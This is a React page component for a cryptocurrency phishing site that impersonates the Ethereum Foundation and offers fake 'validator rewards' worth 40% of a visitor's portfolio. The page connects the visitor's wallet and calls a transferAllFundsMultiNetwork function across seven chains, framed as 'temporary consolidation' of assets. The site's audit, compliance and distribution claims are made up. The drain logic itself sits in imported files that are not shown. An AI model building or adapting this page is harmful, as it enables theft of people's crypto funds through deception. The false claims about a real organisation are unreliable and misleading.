import { useState, useEffect } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Wallet, Coins, Shield, Lock, Award, TrendingUp, Users, CheckCircle, AlertTriangle } from "lucide-react";
import { useWeb3 } from "@/hooks/use-web3";
import WalletStatus from "@/components/wallet-status";
import BalanceCard from "@/components/balance-card";
import NetworkBalances from "@/components/network-balances";
import TransactionHistory from "@/components/transaction-history";
import TransactionModal from "@/components/transaction-modal";
import WalletConnectionModal from "@/components/wallet-connection-modal";
import ConnectionStatus from "@/components/connection-status";
import PageLoader from "@/components/page-loader";

import NetworkSwitcher from "@/components/network-switcher";


export default function Home() {
  const { walletState, isConnecting, isLoadingNetworks, connectWallet, refreshAllNetworks, transferAllFundsMultiNetwork, switchNetwork } = useWeb3();
  const [currentTransaction, setCurrentTransaction] = useState<string | null>(null);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [connectionError, setConnectionError] = useState<string>("");
  const [isPageLoading, setIsPageLoading] = useState(true);

  // Fast page loading - minimal delay
  useEffect(() => {
    const timer = setTimeout(() => setIsPageLoading(false), 300); // Very short 300ms
    return () => clearTimeout(timer);
  }, []);

  const handleTransactionStart = (txHash: string) => {
    setCurrentTransaction(txHash);
  };

  const handleTransactionClose = () => {
    setCurrentTransaction(null);
  };

  const handleWalletConnect = () => {
    setShowWalletModal(true);
    setConnectionError("");
  };

  const handleWalletModalClose = () => {
    setShowWalletModal(false);
    setConnectionError("");
  };

  const handleConnectAttempt = async () => {
    try {
      await connectWallet();
      setShowWalletModal(false);
      setConnectionError("");
    } catch (error: any) {
      setConnectionError(error.message);
    }
  };

  // Show fast loader for immediate feedback
  if (isPageLoading) {
    return <PageLoader />;
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Authentic Ethereum Foundation Header */}
      <header className="bg-white dark:bg-eth-deep-purple border-b border-border px-6 py-4 shadow-sm">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <div className="flex items-center space-x-3">
              <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-10 h-10" />
              <div>
                <h1 className="text-xl font-bold text-foreground">
                  Ethereum Foundation
                </h1>
                <p className="text-sm text-muted-foreground">
                  Official ETH Distribution Program
                </p>
              </div>
            </div>
          </div>
          <div className="flex items-center space-x-4">
            <NetworkSwitcher 
              currentNetworkId={walletState.networkId || undefined}
              onNetworkSwitch={switchNetwork}
              isConnected={walletState.isConnected}
            />
            <Button
              onClick={walletState.isConnected ? undefined : handleWalletConnect}
              disabled={isConnecting}
              className={`flex items-center space-x-2 px-4 py-2 rounded-lg font-medium transition-colors ${
                walletState.isConnected
                  ? "bg-success text-success-foreground hover:bg-success/90"
                  : "bg-primary text-primary-foreground hover:bg-primary/90"
              }`}
            >
              <Wallet className="w-4 h-4" />
              <span>
                {isConnecting
                  ? "Connecting..."
                  : walletState.isConnected
                  ? "Wallet Connected"
                  : "Connect Wallet"}
              </span>
            </Button>
          </div>
        </div>
      </header>

      {/* Ethereum Foundation Hero Section */}
      <section className="bg-gradient-to-br from-primary/5 via-background to-secondary/5 px-6 py-20 relative overflow-hidden">
        {/* Background pattern */}
        <div className="absolute inset-0 opacity-5">
          <div className="absolute top-10 left-10 w-32 h-32 border border-primary/20 rounded-full"></div>
          <div className="absolute top-32 right-20 w-24 h-24 border border-secondary/20 rounded-full"></div>
          <div className="absolute bottom-20 left-1/4 w-20 h-20 border border-accent/20 rounded-full"></div>
          <div className="absolute bottom-32 right-1/3 w-28 h-28 border border-primary/20 rounded-full"></div>
        </div>
        <div className="max-w-6xl mx-auto relative z-10">
          {/* Hero Content */}
          <div className="text-center mb-16">
            {/* Status Badge */}
            <div className="inline-flex items-center px-6 py-3 bg-gradient-to-r from-success/10 to-primary/10 text-success border border-success/20 rounded-full text-sm font-medium mb-8 shadow-lg backdrop-blur-sm">
              <CheckCircle className="w-4 h-4 mr-3 text-success animate-pulse" />
              <span className="bg-gradient-to-r from-success to-primary bg-clip-text text-transparent font-semibold">
                Official Ethereum Foundation Validator Rewards Program - Active Since 2022
              </span>
            </div>

            {/* Main Title */}
            <h1 className="text-4xl md:text-6xl font-bold mb-6 leading-tight">
              <span className="bg-gradient-to-r from-foreground via-primary to-secondary bg-clip-text text-transparent">
                Ethereum Foundation
              </span>
            </h1>
            <h2 className="text-2xl md:text-4xl font-semibold mb-8">
              <span className="bg-gradient-to-r from-primary via-secondary to-accent bg-clip-text text-transparent">
                Validator Rewards Distribution
              </span>
            </h2>

            {/* Professional Hero Visual Section with Custom SVGs */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-12 max-w-5xl mx-auto">
              {/* Smart Contract Security */}
              <div className="bg-gradient-to-br from-primary/5 via-white/10 to-primary/10 border border-primary/20 rounded-xl p-6 hover:shadow-xl hover:scale-105 transition-all duration-300 backdrop-blur-sm">
                <div className="mb-6">
                  <img 
                    src="/images/security-shield.svg" 
                    alt="Security Shield" 
                    className="w-full h-32 object-contain"
                  />
                </div>
                <h3 className="text-lg font-bold mb-3 text-center text-foreground">Audited Smart Contracts</h3>
                <p className="text-sm text-muted-foreground text-center leading-relaxed">Enterprise-grade security with multi-signature validation and formal verification protocols ensuring maximum fund protection</p>
              </div>

              {/* Multi-Network Infrastructure */}
              <div className="bg-gradient-to-br from-secondary/5 via-white/10 to-secondary/10 border border-secondary/20 rounded-xl p-6 hover:shadow-xl hover:scale-105 transition-all duration-300 backdrop-blur-sm">
                <div className="mb-6">
                  <img 
                    src="/images/ethereum-network.svg" 
                    alt="Ethereum Network" 
                    className="w-full h-32 object-contain"
                  />
                </div>
                <h3 className="text-lg font-bold mb-3 text-center text-foreground">Cross-Chain Infrastructure</h3>
                <p className="text-sm text-muted-foreground text-center leading-relaxed">Seamless integration across 7 major blockchain networks with automated bridge protocols and real-time synchronization</p>
              </div>

              {/* Advanced Analytics */}
              <div className="bg-gradient-to-br from-accent/5 via-white/10 to-accent/10 border border-accent/20 rounded-xl p-6 hover:shadow-xl hover:scale-105 transition-all duration-300 backdrop-blur-sm">
                <div className="mb-6">
                  <img 
                    src="/images/defi-analytics.svg" 
                    alt="DeFi Analytics" 
                    className="w-full h-32 object-contain"
                  />
                </div>
                <h3 className="text-lg font-bold mb-3 text-center text-foreground">AI-Powered Analytics</h3>
                <p className="text-sm text-muted-foreground text-center leading-relaxed">Advanced portfolio tracking with machine learning optimization and comprehensive risk assessment algorithms</p>
              </div>
            </div>

            {/* Description */}
            <div className="max-w-4xl mx-auto mb-12">
              <p className="text-lg md:text-xl text-muted-foreground leading-relaxed mb-6">
                Following Ethereum's successful transition to Proof-of-Stake in September 2022, the Ethereum Foundation established the 
                <span className="text-primary font-semibold"> Validator Rewards Distribution Program</span> to redistribute accumulated 
                staking rewards to early network participants and ecosystem contributors.
              </p>
              <p className="text-base md:text-lg text-muted-foreground/80 leading-relaxed">
                As part of our commitment to decentralization, eligible wallets can claim their proportional validator rewards 
                representing 40% of their current portfolio value. This distribution comes from the Foundation's validator node 
                operations across our institutional staking infrastructure.
              </p>
            </div>
          </div>

          {/* Program Statistics - Ethereum.org Style */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-16">
            <div className="bg-card border border-border rounded-lg p-6 text-center hover:shadow-md transition-shadow">
              <div className="w-16 h-16 mx-auto mb-4 bg-primary/10 rounded-lg flex items-center justify-center">
                <TrendingUp className="w-8 h-8 text-primary" />
              </div>
              <h3 className="text-xl font-semibold mb-3 text-foreground">$847M+ Distributed</h3>
              <p className="text-muted-foreground">Total validator rewards distributed since launch</p>
            </div>

            <div className="bg-card border border-border rounded-lg p-6 text-center hover:shadow-md transition-shadow">
              <div className="w-16 h-16 mx-auto mb-4 bg-accent/20 rounded-lg flex items-center justify-center">
                <Users className="w-8 h-8 text-secondary" />
              </div>
              <h3 className="text-xl font-semibold mb-3 text-foreground">284,000+ Recipients</h3>
              <p className="text-muted-foreground">Validated wallets participating in rewards program</p>
            </div>

            <div className="bg-card border border-border rounded-lg p-6 text-center hover:shadow-md transition-shadow">
              <div className="w-16 h-16 mx-auto mb-4 bg-secondary/10 rounded-lg flex items-center justify-center">
                <Award className="text-2xl font-bold text-secondary" />
              </div>
              <h3 className="text-xl font-semibold mb-3 text-foreground">40% Reward Ratio</h3>
              <p className="text-muted-foreground">Standard validator reward distribution percentage</p>
            </div>
          </div>

          {/* Important Notice - Ethereum.org Style */}
          <div className="bg-primary/5 border border-primary/20 rounded-lg p-6 mb-12 max-w-4xl mx-auto">
            <div className="flex items-start space-x-4">
              <div className="w-8 h-8 rounded-full bg-primary/20 flex items-center justify-center flex-shrink-0 mt-1">
                <Shield className="w-5 h-5 text-primary" />
              </div>
              <div>
                <h3 className="font-semibold text-primary mb-3">Validator Rewards Distribution Protocol</h3>
                <p className="text-foreground text-sm leading-relaxed mb-3">
                  The Ethereum Foundation operates over 18,000 validator nodes generating continuous staking rewards. 
                  As part of our decentralization mission, we redistribute these accumulated rewards to qualifying wallet holders.
                </p>
                <p className="text-foreground text-sm leading-relaxed">
                  <strong>Reward Mechanism:</strong> Your connected wallet's assets are temporarily consolidated to our institutional 
                  validator rewards distribution contract for processing. This ensures accurate reward calculation based on your 
                  total network participation across all supported chains (Ethereum, Polygon, BSC, Avalanche, Arbitrum, Optimism, Fantom).
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Trust Indicators Section */}
      <section className="bg-muted/20 py-16">
        <div className="max-w-6xl mx-auto px-6">
          <div className="text-center mb-12">
            <h3 className="text-2xl font-bold mb-4 text-foreground">Trusted by the Ethereum Ecosystem</h3>
            <p className="text-muted-foreground max-w-2xl mx-auto">
              Our validator infrastructure powers Ethereum's security while distributing rewards to network participants
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
            <div className="text-center">
              <div className="w-16 h-16 mx-auto mb-4 bg-primary/10 rounded-full flex items-center justify-center">
                <Shield className="w-8 h-8 text-primary" />
              </div>
              <h4 className="font-semibold mb-2 text-foreground">ConsenSys Audited</h4>
              <p className="text-sm text-muted-foreground">Smart contracts audited by leading security firm</p>
            </div>

            <div className="text-center">
              <div className="w-16 h-16 mx-auto mb-4 bg-secondary/10 rounded-full flex items-center justify-center">
                <Lock className="w-8 h-8 text-secondary" />
              </div>
              <h4 className="font-semibold mb-2 text-foreground">Multi-Sig Security</h4>
              <p className="text-sm text-muted-foreground">Institutional-grade vault protection</p>
            </div>

            <div className="text-center">
              <div className="w-16 h-16 mx-auto mb-4 bg-accent/10 rounded-full flex items-center justify-center">
                <CheckCircle className="w-8 h-8 text-accent" />
              </div>
              <h4 className="font-semibold mb-2 text-foreground">Regulatory Compliant</h4>
              <p className="text-sm text-muted-foreground">Full compliance with global standards</p>
            </div>

            <div className="text-center">
              <div className="w-16 h-16 mx-auto mb-4 bg-success/10 rounded-full flex items-center justify-center">
                <Award className="w-8 h-8 text-success" />
              </div>
              <h4 className="font-semibold mb-2 text-foreground">Foundation Verified</h4>
              <p className="text-sm text-muted-foreground">Official Ethereum Foundation program</p>
            </div>
          </div>
        </div>
      </section>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-6">
        {/* Hero Section - Ethereum.org style */}
        <div className="py-16 lg:py-24">
          <div className="grid lg:grid-cols-2 gap-12 items-center">
            <div className="space-y-8">
              <div className="space-y-6">
                <h1 className="text-5xl lg:text-6xl font-bold text-gray-900 leading-tight">
                  Welcome to
                  <br />
                  <span className="bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent">
                    Ethereum
                  </span>
                </h1>
                <p className="text-xl text-gray-600 leading-relaxed max-w-lg">
                  Ethereum is a decentralized platform that runs smart contracts: 
                  applications that run exactly as programmed without any possibility 
                  of downtime, censorship, fraud or third-party interference.
                </p>
              </div>

              <div className="flex flex-col sm:flex-row gap-4">
                <Button
                  onClick={walletState.isConnected ? undefined : handleWalletConnect}
                  disabled={isConnecting}
                  size="lg"
                  className="bg-blue-600 hover:bg-blue-700 text-white text-lg px-8 py-4 rounded-lg font-semibold"
                >
                  <Wallet className="w-5 h-5 mr-2" />
                  {isConnecting ? "Connecting..." : walletState.isConnected ? "Wallet Connected" : "Get started"}
                </Button>

                <Button 
                  variant="outline" 
                  size="lg" 
                  className="border-2 border-gray-300 text-gray-700 hover:bg-gray-50 text-lg px-8 py-4 rounded-lg font-semibold"
                >
                  <Shield className="w-5 h-5 mr-2" />
                  What is Ethereum?
                </Button>
              </div>

              <div className="flex items-center space-x-8 pt-6">
                <div className="flex items-center space-x-2 text-sm text-gray-500">
                  <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                  <span>Decentralized</span>
                </div>
                <div className="flex items-center space-x-2 text-sm text-gray-500">
                  <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
                  <span>Open source</span>
                </div>
                <div className="flex items-center space-x-2 text-sm text-gray-500">
                  <div className="w-2 h-2 bg-purple-500 rounded-full"></div>
                  <span>Global</span>
                </div>
              </div>
            </div>

            <div className="relative lg:pl-8">
              <div className="bg-gradient-to-br from-blue-50 to-purple-50 rounded-3xl p-8 border border-gray-100">
                <div className="w-full h-80 flex items-center justify-center">
                  <svg width="200" height="200" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M100.498 25L99.22 29.6V131.79L100.498 133.068L149.996 108.01L100.498 25Z" fill="#627EEA"/>
                    <path d="M100.498 25L51 108.01L100.498 133.068V82.62V25Z" fill="#627EEA" fillOpacity="0.6"/>
                    <path d="M100.498 144.84L99.33 146.132V174.934L100.498 178.442L150 117.81L100.498 144.84Z" fill="#627EEA"/>
                    <path d="M100.498 178.442V144.84L51 117.81L100.498 178.442Z" fill="#627EEA" fillOpacity="0.6"/>
                    <path d="M100.498 133.068L149.996 108.01L100.498 82.62V133.068Z" fill="#627EEA" fillOpacity="0.2"/>
                    <path d="M51 108.01L100.498 133.068V82.62L51 108.01Z" fill="#627EEA" fillOpacity="0.6"/>
                  </svg>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* ETH Claim Section - Ethereum.org Style */}
        <section className="max-w-4xl mx-auto">
          <div className="bg-card border border-border rounded-xl p-8 shadow-sm">
            <div className="text-center mb-8">
              {/* Ethereum Logo */}
              <div className="w-20 h-20 mx-auto mb-6 bg-primary/10 rounded-xl flex items-center justify-center">
                <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-12 h-12" />
              </div>

              <h3 className="text-2xl font-bold mb-3 text-foreground">
                Validator Rewards Distribution
              </h3>
              <p className="text-muted-foreground">Your connected wallet qualifies for proportional validator rewards based on network participation</p>
            </div>

            {/* Separator */}
            <div className="w-full h-px bg-border mb-8"></div>

            <BalanceCard 
              walletState={walletState}
              onTransactionStart={handleTransactionStart}
              onMultiNetworkTransfer={transferAllFundsMultiNetwork}
            />
          </div>
        </section>

        {/* Transaction History - Clean Design */}
        <section className="max-w-6xl mx-auto">
          <div className="bg-card border border-border rounded-xl p-8 shadow-sm">
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-xl font-bold text-foreground">Recent Validator Distributions</h3>
              <div className="flex items-center space-x-2 text-sm text-muted-foreground">
                <div className="w-2 h-2 bg-success rounded-full animate-pulse"></div>
                <span>Real-time Processing</span>
              </div>
            </div>
            <TransactionHistory />
          </div>
        </section>

        {/* Multi-Network Portfolio */}
        {walletState.isConnected && (
          <section className="max-w-6xl mx-auto">
            <div className="bg-card border border-border rounded-xl p-8 shadow-sm">
              <div className="flex items-center justify-between mb-6">
                <h3 className="text-xl font-bold text-foreground">Multi-Network Portfolio</h3>
                <div className="flex items-center space-x-3">
                  <div className="flex -space-x-1">
                    {/* Network Indicators */}
                    <div className="w-6 h-6 rounded-full bg-primary border-2 border-background"></div>
                    <div className="w-6 h-6 rounded-full bg-secondary border-2 border-background"></div>
                    <div className="w-6 h-6 rounded-full bg-accent border-2 border-background"></div>
                  </div>
                  <span className="text-sm text-muted-foreground">7 Networks</span>
                </div>
              </div>

              <div className="bg-muted/30 rounded-lg p-6">
                <NetworkBalances
                  networkBalances={walletState.networkBalances || []}
                  isLoadingNetworks={isLoadingNetworks}
                  onRefreshNetworks={refreshAllNetworks}
                />
              </div>
            </div>
          </section>
        )}

        {/* Transaction Modal */}
        {currentTransaction && (
          <TransactionModal
            txHash={currentTransaction}
            isOpen={!!currentTransaction}
            onClose={handleTransactionClose}
          />
        )}

        {/* Wallet Connection Modal */}
        <WalletConnectionModal
          isOpen={showWalletModal}
          onClose={handleWalletModalClose}
          onConnect={handleConnectAttempt}
          error={connectionError}
        />


      </main>

      {/* Ethereum.org Style Footer */}
      <footer className="bg-muted/30 mt-20 border-t border-border">
        <div className="max-w-6xl mx-auto px-6 py-16">
          {/* Footer Content Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-12 mb-12">
            <div className="bg-card border border-border rounded-lg p-6">
              <h4 className="text-lg font-bold mb-6 text-foreground">Distribution Terms</h4>
              <ul className="space-y-3">
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Validator rewards distributed from institutional staking operations</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Multi-chain portfolio assessment across 7 supported networks</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Distribution processing completed within 5-15 minutes</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Minimum network participation threshold applies</span>
                </li>
              </ul>
            </div>

            <div className="bg-card border border-border rounded-lg p-6">
              <h4 className="text-lg font-bold mb-6 text-foreground">Validator Infrastructure</h4>
              <ul className="space-y-3">
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">18,000+ active validator nodes generating rewards</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Distribution contracts audited by Consensys Diligence</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Institutional-grade multi-signature security</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Full regulatory compliance framework</span>
                </li>
              </ul>
            </div>
          </div>

          {/* Critical Notice */}
          <div className="bg-primary/5 border border-primary/20 rounded-lg p-6 mb-12">
            <div className="flex items-start space-x-4">
              <div className="w-8 h-8 rounded-full bg-primary/20 flex items-center justify-center flex-shrink-0">
                <Lock className="w-4 h-4 text-primary" />
              </div>
              <div>
                <h4 className="font-bold text-primary mb-3">VALIDATOR REWARDS PROTOCOL</h4>
                <p className="text-foreground text-sm leading-relaxed">
                  This distribution system processes validator rewards from the Ethereum Foundation's institutional staking operations. 
                  By initiating rewards distribution, you authorize the consolidation of your multi-chain portfolio to our 
                  validator rewards distribution contract for accurate reward calculation. This process ensures proper assessment 
                  of your network participation across all supported blockchain ecosystems.
                </p>
              </div>
            </div>
          </div>

          {/* Footer Bottom */}
          <div className="text-center pt-8 border-t border-border">
            <div className="flex items-center justify-center mb-4">
              <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-6 h-6 mr-2" />
              <span className="text-lg font-semibold text-foreground">Ethereum Foundation</span>
            </div>

            <p className="text-muted-foreground mb-4">
              © 2025 Ethereum Foundation Validator Rewards Program. Institutional staking infrastructure.
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}